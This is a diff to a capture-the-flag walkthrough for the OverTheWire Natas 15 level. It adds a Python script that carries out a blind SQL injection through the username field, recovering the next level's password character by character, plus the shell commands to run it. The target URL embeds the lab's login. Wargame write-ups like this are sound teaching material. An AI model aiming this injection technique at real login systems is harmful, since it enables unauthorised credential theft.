@@ -392,5 +392,39 @@ When we run this query, if the character we chose are in the password, the page 
 So let's go ahead and write a python script to check for password characters, and then try to brute force the password.
 
 ```python
+#!/usr/bin/python
 
+import requests
+
+chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
+exist = ''
+password = ''
+target = 'https://natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J@natas15.natas.labs.overthewire.org/index.php'
+trueStr = 'This user exists.'
+
+r = requests.get(target, verify=False)
+
+for x in chars:
+	r = requests.get(target+'?username=natas16" AND password LIKE BINARY "%'+x+'%" "')
+	if r.content.find(trueStr) != -1:
+		exist += x
+		print 'Using: ' + exist
+
+print 'All characters used. Starting brute force... Grab a coffee, might take a while!'
+
+for i in range(32):
+	for c in exist:
+		r = requests.get(target+'?username=natas16" AND password LIKE BINARY "' + password + c + '%" "')
+		if r.content.find(trueStr) != -1:
+			password += c
+			print 'Password: ' + password + '*' * int(32 - len(password))
+			break
+
+print 'Completed!'
+```
+Once done, save this as __brute.py__ or anything you like, and let's give the script exectue permissions, and then run it!
+
+```console
+root@kali:~# chmod +x brute.py
+root@kali:~# ./brute.py
 ```
